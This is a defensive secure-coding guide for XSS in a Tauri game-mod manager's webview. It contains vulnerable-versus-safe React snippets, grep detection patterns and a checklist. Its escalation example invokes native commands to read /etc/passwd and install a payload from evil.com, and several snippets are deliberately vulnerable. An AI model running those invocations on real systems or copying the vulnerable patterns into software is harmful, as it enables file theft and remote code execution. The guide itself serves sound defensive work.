# Webview XSS Security

XSS in a Tauri webview is **Critical severity** — not just a session hijack risk.
An attacker achieving XSS can invoke `window.__TAURI__` to call any exposed Rust command,
effectively escalating to native code execution (file system, process spawning, etc.).

## Attack Escalation Path

```
XSS in webview
  → window.__TAURI__.invoke("read_file", { path: "/etc/passwd" })
  → window.__TAURI__.invoke("start_game", { ... })
  → window.__TAURI__.invoke("install_mod", { url: "http://evil.com/payload" })
```

## Vulnerable Patterns

```tsx
// VULNERABLE: Mod description from GameBanana rendered as HTML
<div dangerouslySetInnerHTML={{ __html: mod.description }} />

// VULNERABLE: eval on data from API
const config = eval(apiResponse.configScript);

// VULNERABLE: Template literal injected into DOM
el.innerHTML = `<h1>${mod.name}</h1><p>${mod.description}</p>`;

// VULNERABLE: Dynamic href with user-controlled URL
<a href={mod.authorUrl}>Author</a>
// If authorUrl = "javascript:alert(1)" — XSS

// VULNERABLE: Injecting user content into script context
<script>var data = {JSON.stringify(untrustedData)};</script>

// VULNERABLE: Using URL from deep link without validation
const url = new URL(deepLinkUrl);
window.location.href = url.searchParams.get('redirect');
```

## Safe Patterns

```tsx
// SAFE: React auto-escapes interpolation
<p>{mod.description}</p>
<span>{mod.name}</span>

// SAFE: dangerouslySetInnerHTML with DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(mod.description) }} />

// SAFE: URL validation before rendering links
function SafeLink({ url, children }) {
  const parsed = new URL(url);
  if (!['http:', 'https:'].includes(parsed.protocol)) return null;
  return <a href={url} rel="noopener noreferrer">{children}</a>;
}

// SAFE: Structured data, not raw HTML
<ModCard title={mod.name} description={mod.summary} />

// SAFE: textContent instead of innerHTML
el.textContent = userInput;
```

## Detection Patterns

```
# dangerouslySetInnerHTML usage
grep -rn 'dangerouslySetInnerHTML' --include='*.tsx' --include='*.jsx'

# innerHTML/outerHTML assignments
grep -rn '\.innerHTML\s*=' --include='*.ts' --include='*.tsx'
grep -rn '\.outerHTML\s*=' --include='*.ts' --include='*.tsx'

# eval and similar dynamic execution
grep -rn 'eval(' --include='*.ts' --include='*.tsx'
grep -rn 'new Function(' --include='*.ts' --include='*.tsx'
grep -rn 'setTimeout(\s*["\x27]' --include='*.ts' --include='*.tsx'

# javascript: protocol in links
grep -rn 'href.*javascript:' --include='*.tsx'

# Dynamic URL navigation
grep -rn 'window\.location' --include='*.ts' --include='*.tsx'
grep -rn 'window\.open(' --include='*.ts' --include='*.tsx'

# Check CSP configuration
grep -rn 'dangerousDisableAssetCspModification\|security\|csp' --include='tauri.conf.json'
```

## Checklist

- [ ] No `dangerouslySetInnerHTML` with unsanitized mod data (descriptions, names, metadata)
- [ ] No `eval()`, `new Function()`, or `setTimeout(string)` with external data
- [ ] No `innerHTML` or `outerHTML` assignments with untrusted content
- [ ] All `href` and `src` attributes validated against `https:` allowlist
- [ ] Deep link parameters validated and sanitized before use in UI
- [ ] Mod metadata (names, descriptions, author info) rendered via React interpolation only
- [ ] CSP configured in `tauri.conf.json` to block `eval`, restrict script sources
- [ ] No `unsafe-inline` or `unsafe-eval` in CSP unless absolutely necessary
- [ ] Third-party content (mod images, author avatars) loaded via `<img>` with CSP `img-src`
- [ ] DOMPurify used if HTML rendering of mod descriptions is required
